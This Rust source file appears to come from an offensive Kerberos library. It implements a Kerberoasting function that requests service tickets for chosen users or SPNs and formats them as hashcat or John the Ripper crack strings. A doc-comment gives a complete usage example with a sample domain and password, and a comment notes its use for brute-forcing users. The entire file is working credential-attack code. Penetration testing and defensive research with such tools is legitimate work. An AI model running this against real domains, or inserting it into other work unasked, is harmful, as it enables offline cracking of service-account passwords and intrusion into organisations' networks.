use crate::{
	communication::KdcComm,
	core::{
		forge, get_user_tgt, request_regular_tgs, tgs_to_crack_string, CrackFormat, CredFormat, EncryptionType,
		KrbUser, Vault,
	},
	error::Result,
};
use kerberos_asn1::PrincipalName;
use kerberos_crypto::Key;

struct KerberoastService
{
	user: KrbUser,
	service: Option<String>,
}

impl KerberoastService
{
	fn new(user: KrbUser, service: Option<String>) -> Self
	{
		Self { user, service }
	}

	fn service(&self) -> PrincipalName
	{
		match &self.service
		{
			None => forge::new_nt_enterprise(&self.user),
			Some(s) => forge::new_nt_srv_inst(s),
		}
	}
}

/// To format encrypted part of tickets in order to be cracked by hashcat or john
///
/// You need to provide a vector with the user's services. Each entry of the vector must have one of the
/// following formats: username, domain/username, username:spn, domain/username:spn
///
/// When a service SPN is not specified, then an NT-ENTERPRISE principal is used
/// This can also be useful to bruteforce users with services
///
/// # Examples
///
/// ```
/// use cerbero_lib::{
///     kerberoast, CrackFormat, CredFormat, EncryptionType, FileVault, KdcComm, Kdcs, Key, KrbUser, TransportProtocol,
/// };
/// use std::net::{IpAddr, Ipv4Addr};
///
/// fn main()
/// {
///     let mut kdcs = Kdcs::new();
///     let kdc_ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
///     kdcs.insert("DOMAIN.COM".to_string(), kdc_ip);
///
///     let user = KrbUser::new("Username".to_string(), "DOMAIN.COM".to_string());
///     let key = Key::Secret("Password".to_string());
///     let kdccomm = KdcComm::new(kdcs, TransportProtocol::TCP);
///     let mut vault = FileVault::new("tickets.ccache".to_string());
///
///     let services: Vec<String> = vec![
///                                      "Username".to_string(),
///                                      "DOMAIN/Username".to_string(),
///                                      "Username:SPN".to_string(),
///                                      "DOMAIN/Username:SPN".to_string()
///     ];
///
///     match kerberoast(
///                      user,
///                      services,
///                      &mut vault,
///                      None,
///                      Some(&key),
///                      CredFormat::Ccache,
///                      CrackFormat::Hashcat,
///                      Some(EncryptionType::RC4),
///                      kdccomm,
///     )
///     {
///         Ok(hashes) =>
///         {
///             for hash in hashes.iter()
///             {
///                 println!("Crackable hash: {}", hash);
///             }
///         },
///         Err(e) => panic!("Failed to kerberoast user: {}", e),
///     };
/// }
/// ```
pub fn kerberoast(user: KrbUser,
                  user_services: Vec<String>,
                  in_vault: &mut dyn Vault,
                  out_vault: Option<&dyn Vault>,
                  user_key: Option<&Key>,
                  cred_format: CredFormat,
                  crack_format: CrackFormat,
                  etype: Option<EncryptionType>,
                  mut kdccomm: KdcComm)
                  -> Result<Vec<String>>
{
	let krbts_srvs = parse_kerberoast(user_services, &user.realm)?;

	let channel = kdccomm.create_channel(&user.realm)?;
	let tgt = get_user_tgt(user.clone(), user_key, etype.as_ref().map(|e| e.as_constant()), in_vault, &*channel)?;

	let mut tickets = in_vault.dump()?;
	let mut crack_strs: Vec<String> = vec![];

	for krbst_srv in krbts_srvs
	{
		let service = krbst_srv.service();

		let tgs = request_regular_tgs(
		                              user.clone(),
		                              service.clone(),
		                              tgt.clone(),
		                              etype.as_ref().map(|e| vec![e.as_constant()]),
		                              &mut kdccomm,
		)?;
		crack_strs.push(tgs_to_crack_string(&krbst_srv.user.name, &service.to_string(), &tgs.ticket, crack_format));
		tickets.push(tgs);
	}

	if let Some(out_vault) = out_vault
	{
		out_vault.save_as(tickets, cred_format)?;
	}

	Ok(crack_strs)
}

/// Parse a line that specifies a service to be kerberoasted.
/// The line must include an user and optionally an SPN. The following formats
/// are supported:
/// * `user`
/// * `domain/user`
/// * `user:spn`
/// * `domain/user:spn`
///
fn parse_kerberoast_service(line: &str, default_realm: &str) -> Result<KerberoastService>
{
	let mut parts: Vec<&str> = line.split(':').collect();

	let user_str = parts.remove(0);

	if user_str.is_empty()
	{
		Err("No user")?
	}

	let user_parts: Vec<&str> = user_str.split(|c| ['/', '\\'].contains(&c)).collect();

	let user = match user_parts.len()
	{
		1 => KrbUser::new(user_parts[0].to_string(), default_realm.to_string()),
		2 =>
		{
			if user_parts[0].is_empty()
			{
				Err("Empty domain")?
			}

			if user_parts[1].is_empty()
			{
				Err("Empty user")?;
			}
			KrbUser::new(user_parts[1].to_string(), user_parts[0].to_string())
		},
		_ => Err(format!("Invalid user '{}', it must be <domain>/<username>", parts[0]))?,
	};

	if parts.is_empty()
	{
		return Ok(KerberoastService::new(user, None));
	}

	let spn = parts.join(":");

	Ok(KerberoastService::new(user, Some(spn)))
}

/// Parse a vector that includes services to be kerberoasted.
fn parse_kerberoast(services_str: Vec<String>, default_realm: &str) -> Result<Vec<KerberoastService>>
{
	let mut services = Vec::new();
	for service in services_str
	{
		let serv = parse_kerberoast_service(&service, default_realm).map_err(|e| {
			                                                            format!("Invalid service '{}': {}", service, e)
		                                                            })?;
		services.push(serv);
	}

	Ok(services)
}
